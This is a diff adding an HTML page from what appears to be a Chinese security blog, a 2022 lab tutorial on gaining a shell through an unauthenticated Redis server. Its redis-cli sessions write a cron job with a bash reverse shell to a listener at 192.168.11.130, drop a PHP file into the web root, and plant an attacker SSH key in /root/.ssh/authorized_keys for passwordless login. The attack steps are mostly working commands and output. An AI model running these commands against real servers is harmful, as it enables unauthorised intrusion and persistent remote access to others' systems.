@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Redis_getshell的三种姿势（续） | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言 除了上一篇的主从复制rce，还有几种getshell的方式。下面来列举一下。 Redis简介 redis是一个使用C语言编写，开源高性能非关">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/80/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/80/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Redis_getshell的三种姿势（续）" />
+<meta property="og:description" content="前言 除了上一篇的主从复制rce，还有几种getshell的方式。下面来列举一下。 Redis简介 redis是一个使用C语言编写，开源高性能非关" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/80/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-07T07:26:04+00:00" />
+<meta property="article:modified_time" content="2022-01-07T07:26:04+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Redis_getshell的三种姿势（续）"/>
+<meta name="twitter:description" content="前言 除了上一篇的主从复制rce，还有几种getshell的方式。下面来列举一下。 Redis简介 redis是一个使用C语言编写，开源高性能非关"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Redis_getshell的三种姿势（续）",
+      "item": "https://a10nggg.github.io/archives/80/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Redis_getshell的三种姿势（续）",
+  "name": "Redis_getshell的三种姿势（续）",
+  "description": "前言 除了上一篇的主从复制rce，还有几种getshell的方式。下面来列举一下。 Redis简介 redis是一个使用C语言编写，开源高性能非关",
+  "keywords": [
+    
+  ],
+  "articleBody": "前言 除了上一篇的主从复制rce，还有几种getshell的方式。下面来列举一下。\nRedis简介 redis是一个使用C语言编写，开源高性能非关系型的键值对存储系统，和memcached类似，在企业中一般被当作缓存中间件使用，典型的应用场景如秒杀活动、热点数据缓存和分布式锁等。\n安装Redis（以centos7为例） yum install -y gcc #安装gcc\rwget http://download.redis.io/releases/redis-5.0.3.tar.gz #下载压缩包\rtar -zxvf redis-5.0.3.tar.gz #解压压缩包\rcd redis-5.0.3\rmake #编译\rmake install PREFIX=/usr/local/redis #安装并指定安装目录\r下面来配置后台启动和允许远程登陆\ncp redis.conf /usr/local/redis/bin/\nvi redis.conf\n修改 redis.conf 文件，\n把 daemonize no 改为 daemonize yes。\n修改之后就能后台启动了。否则关掉命令窗口之后服务就断了。\n{.wp-editor-md-post-content-link}\n将bind 127.0.0.1 注释掉：#bind 127.0.0.1\n默认只允许本机，注释掉之后不限制ip\n将protected-mode yes 改为：protected-mode no\n默认保护模式，改为no\n然后就能远程登陆数据库了。\n{.wp-editor-md-post-content-link}\ncrontab-计划任务 之前搞大数据，计划任务用得太多了，计划任务上线的思路都是一样的，目的就是为了执行命令，让靶机上线。\nCONFIG SET parameter value\nCONFIG SET 命令可以动态地调整 Redis 服务器的配置(configuration)而无须重启。\n你可以使用它修改配置参数，或者改变 Redis 的持久化(Persistence)方式。\nCONFIG SET 可以修改的配置参数可以使用命令 CONFIG GET * 来列出，所有被 CONFIG SET 修改的配置参数都会立即生效。\n首先在自己的vps上开启监听：\nnc -lvp 9999\n{.wp-editor-md-post-content-link}\n然后在给靶机设置上计划任务\nroot@root:~# redis-cli -h 192.168.11.140\r192.168.11.140:6379\u003e set test \"\\n43 21 * * * bash -i \u003e\u0026 /dev/tcp/192.168.11.130/8888 0\u003e\u00261\\n\"\rOK\r192.168.11.140:6379\u003e config set dir /var/spool/cron/ OK\r192.168.11.140:6379\u003e config set dbfilename root\rOK\r192.168.11.140:6379\u003e save\rOK\r192.168.11.140:6379\u003e {.wp-editor-md-post-content-link}\n可以看到计划任务已经写进系统了。\n这儿设置的是每天的21：43执行这个反弹shell的命令，因为我这马上就要到这个点了，所以他到点就会给我反弹过来。\n{.wp-editor-md-post-content-link}\n很准时啊，到点儿shell就给我弹过来了。\nRedis写入webshell root@root:~# redis-cli -h 192.168.11.140\r192.168.11.140:6379\u003e CONFIG SET dir /var/www/html\rOK\r192.168.11.140:6379\u003e CONFIG SET dbfilename shell.php\rOK\r192.168.11.140:6379\u003e SET shell \"\u003c?php phpinfo();?\u003e\"\rOK\r192.168.11.140:6379\u003e BGSAVE Background saving started\r192.168.11.140:6379\u003e 我们查看web目录，发现shell已经写入了。\n{.wp-editor-md-post-content-link}\n写入的php代码正常运行。\n{.wp-editor-md-post-content-link}\n写入ssh-keygen公钥然后ssh免密登录 免密登陆，又是大数据老生常谈的东西了。（但是在这需要注意的是，）\n基本原理原理就是将攻击机（kali）生成的公钥文件，写到靶机（centos7）的~/.ssh/id_rsa.pub文件里，然后就可以用kali免密登陆靶机了。\n基本的步骤为：\n客户端发出认证请求； 服务器端使用客户端发送的公钥对一个随机的256位的字符串进行加密，并发送给 客户端； 客户端使用私钥对字符串进行解密，并生成一个MD5值发送给服务器端； 服务器端根据原始随机字符串生成MD5值进行匹配, 确认客户端身份； 至此, 双方互相确认对方身份并建立加密信道, 可以正式进行安全通信。\n{.wp-editor-md-post-content-link} Kali创建密钥对 ssh-keygen -t rsa\n首次输入命令后，然后一直回车就ok。\n如果不是第一次生成，在覆盖写入那儿输y就行。\n然后通过redis执行：\nroot@root:~# redis-cli -h 192.168.11.140\r192.168.11.140:6379\u003e config set dir /root/.ssh\rOK\r192.168.11.140:6379\u003e config set dbfilename authorized_keys\rOK\r192.168.11.140:6379\u003e save\rOK\r192.168.11.140:6379\u003e 设置好目录和文件名之后，我继续向靶机写入公钥。\nroot@root:~# cd .ssh/\rroot@root:~/.ssh# (echo -e \"\\n\";cat id_rsa.pub;echo -e \"\\n\")\u003ekey.txt#\rroot@root:~/.ssh# cat key.txt |redis-cli -h 192.168.11.140 -x set crack\rOK\rroot@root:~/.ssh# 这儿有一个坑，就是如果.ssh目录的权限不够，公钥写不进去。\n我们查看靶机的.ssh/authorized_keys 文件，发现公钥文件已经写入成功。\n{.wp-editor-md-post-content-link}\n然后使用kali连接\nssh 192.168.11.140\n{.wp-editor-md-post-content-link}\n",
+  "wordCount" : "1295",
+  "inLanguage": "en",
+  "datePublished": "2022-01-07T07:26:04Z",
+  "dateModified": "2022-01-07T07:26:04Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/80/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Redis_getshell的三种姿势（续）
+    </h1>
+    <div class="post-meta"><span title='2022-01-07 07:26:04 +0000 +0000'>January 7, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h1>
+<p>除了上一篇的主从复制rce，还有几种getshell的方式。下面来列举一下。</p>
+<h1 id="redis简介">Redis简介<a hidden class="anchor" aria-hidden="true" href="#redis简介">#</a></h1>
+<p>redis是一个使用C语言编写，开源高性能非关系型的键值对存储系统，和memcached类似，在企业中一般被当作缓存中间件使用，典型的应用场景如秒杀活动、热点数据缓存和分布式锁等。</p>
+<h1 id="安装redis以centos7为例">安装Redis（以centos7为例）<a hidden class="anchor" aria-hidden="true" href="#安装redis以centos7为例">#</a></h1>
+<pre><code class="line-numbers">yum install -y gcc #安装gcc
+wget http://download.redis.io/releases/redis-5.0.3.tar.gz #下载压缩包
+tar -zxvf redis-5.0.3.tar.gz #解压压缩包
+cd redis-5.0.3
+make #编译
+make install PREFIX=/usr/local/redis #安装并指定安装目录
+</code></pre>
+<p>下面来配置后台启动和允许远程登陆<br>
+<code>cp redis.conf /usr/local/redis/bin/&lt;br /&gt; vi redis.conf</code><br>
+修改 redis.conf 文件，<br>
+把 daemonize no 改为 daemonize yes。<br>
+修改之后就能后台启动了。否则关掉命令窗口之后服务就断了。<br>
+<a href="/uploads/2022/01/wp_editor_md_65379bc159d176889b6a9ed9024bd04f.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_65379bc159d176889b6a9ed9024bd04f.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<p>将bind 127.0.0.1 注释掉：#bind 127.0.0.1<br>
+默认只允许本机，注释掉之后不限制ip<br>
+将protected-mode yes 改为：protected-mode no<br>
+默认保护模式，改为no<br>
+然后就能远程登陆数据库了。<br>
+<a href="/uploads/2022/01/wp_editor_md_16064532c8ea2a55141cfe960be00135.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_16064532c8ea2a55141cfe960be00135.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="crontab-计划任务">crontab-计划任务<a hidden class="anchor" aria-hidden="true" href="#crontab-计划任务">#</a></h1>
+<p>之前搞大数据，计划任务用得太多了，计划任务上线的思路都是一样的，目的就是为了执行命令，让靶机上线。</p>
+<p>CONFIG SET parameter value<br>
+CONFIG SET 命令可以动态地调整 Redis 服务器的配置(configuration)而无须重启。<br>
+你可以使用它修改配置参数，或者改变 Redis 的持久化(Persistence)方式。<br>
+CONFIG SET 可以修改的配置参数可以使用命令 CONFIG GET * 来列出，所有被 CONFIG SET 修改的配置参数都会立即生效。</p>
+<p>首先在自己的vps上开启监听：<br>
+<code>nc -lvp 9999</code><br>
+<a href="/uploads/2022/01/wp_editor_md_620b61973c8cc779f05113172be4b4cd.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_620b61973c8cc779f05113172be4b4cd.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+然后在给靶机设置上计划任务</p>
+<pre><code class="line-numbers">root@root:~# redis-cli -h 192.168.11.140
+192.168.11.140:6379&gt; set test "\n43 21 * * * bash -i &gt;& /dev/tcp/192.168.11.130/8888 0&gt;&1\n"
+OK
+192.168.11.140:6379&gt; config set dir /var/spool/cron/ 
+OK
+192.168.11.140:6379&gt; config set dbfilename root
+OK
+192.168.11.140:6379&gt; save
+OK
+192.168.11.140:6379&gt; 
+</code></pre>
+<p><a href="/uploads/2022/01/wp_editor_md_ff1b39b51bc341f9920254cc316e4f74.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_ff1b39b51bc341f9920254cc316e4f74.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+可以看到计划任务已经写进系统了。<br>
+这儿设置的是每天的21：43执行这个反弹shell的命令，因为我这马上就要到这个点了，所以他到点就会给我反弹过来。<br>
+<a href="/uploads/2022/01/wp_editor_md_dba2a71094a1fc6f7566714eeeb2d64a.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_dba2a71094a1fc6f7566714eeeb2d64a.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+很准时啊，到点儿shell就给我弹过来了。</p>
+<h1 id="redis写入webshell">Redis写入webshell<a hidden class="anchor" aria-hidden="true" href="#redis写入webshell">#</a></h1>
+<pre><code class="line-numbers">root@root:~# redis-cli -h 192.168.11.140
+192.168.11.140:6379&gt; CONFIG SET dir /var/www/html
+OK
+192.168.11.140:6379&gt; CONFIG SET dbfilename shell.php
+OK
+192.168.11.140:6379&gt; SET shell "&lt;?php phpinfo();?&gt;"
+OK
+192.168.11.140:6379&gt; BGSAVE 
+Background saving started
+192.168.11.140:6379&gt; 
+</code></pre>
+<p>我们查看web目录，发现shell已经写入了。<br>
+<a href="/uploads/2022/01/wp_editor_md_d24457ecb994ad9014fca5effd35e532.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_d24457ecb994ad9014fca5effd35e532.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+写入的php代码正常运行。<br>
+<a href="/uploads/2022/01/wp_editor_md_571f6bca495d3a342f16a43e65b120e7.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_571f6bca495d3a342f16a43e65b120e7.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="写入ssh-keygen公钥然后ssh免密登录">写入ssh-keygen公钥然后ssh免密登录<a hidden class="anchor" aria-hidden="true" href="#写入ssh-keygen公钥然后ssh免密登录">#</a></h1>
+<p>免密登陆，又是大数据老生常谈的东西了。（但是在这需要注意的是，）<br>
+基本原理原理就是将攻击机（kali）生成的公钥文件，写到靶机（centos7）的~/.ssh/id_rsa.pub文件里，然后就可以用kali免密登陆靶机了。<br>
+基本的步骤为：</p>
+<ul>
+<li>客户端发出认证请求；</li>
+<li>服务器端使用客户端发送的公钥对一个随机的256位的字符串进行加密，并发送给 客户端；</li>
+<li>客户端使用私钥对字符串进行解密，并生成一个MD5值发送给服务器端；</li>
+<li>服务器端根据原始随机字符串生成MD5值进行匹配, 确认客户端身份；</li>
+<li>至此, 双方互相确认对方身份并建立加密信道, 可以正式进行安全通信。<br>
+<a href="/uploads/2022/01/wp_editor_md_e7717d5f894bbdb5e36add79676bfa9c.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_e7717d5f894bbdb5e36add79676bfa9c.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</li>
+</ul>
+<h2 id="kali创建密钥对">Kali创建密钥对<a hidden class="anchor" aria-hidden="true" href="#kali创建密钥对">#</a></h2>
+<p><code>ssh-keygen -t rsa</code><br>
+首次输入命令后，然后一直回车就ok。<br>
+如果不是第一次生成，在覆盖写入那儿输y就行。</p>
+<p>然后通过redis执行：</p>
+<pre><code class="line-numbers">root@root:~# redis-cli -h 192.168.11.140
+192.168.11.140:6379&gt; config set dir /root/.ssh
+OK
+192.168.11.140:6379&gt; config set dbfilename authorized_keys
+OK
+192.168.11.140:6379&gt; save
+OK
+192.168.11.140:6379&gt; 
+</code></pre>
+<p>设置好目录和文件名之后，我继续向靶机写入公钥。</p>
+<pre><code class="line-numbers">root@root:~# cd .ssh/
+root@root:~/.ssh# (echo -e "\n";cat id_rsa.pub;echo -e "\n")&gt;key.txt#
+root@root:~/.ssh# cat key.txt |redis-cli -h 192.168.11.140 -x set crack
+OK
+root@root:~/.ssh# 
+</code></pre>
+<p>这儿有一个坑，就是如果.ssh目录的权限不够，公钥写不进去。<br>
+我们查看靶机的.ssh/authorized_keys 文件，发现公钥文件已经写入成功。<br>
+<a href="/uploads/2022/01/wp_editor_md_72c38872ddceed451fb2a755fa99cfdb.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_72c38872ddceed451fb2a755fa99cfdb.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<p>然后使用kali连接<br>
+<code>ssh 192.168.11.140</code><br>
+<a href="/uploads/2022/01/wp_editor_md_bd52eae9f189c1623e3a5a41f8bf165b.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_bd52eae9f189c1623e3a5a41f8bf165b.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
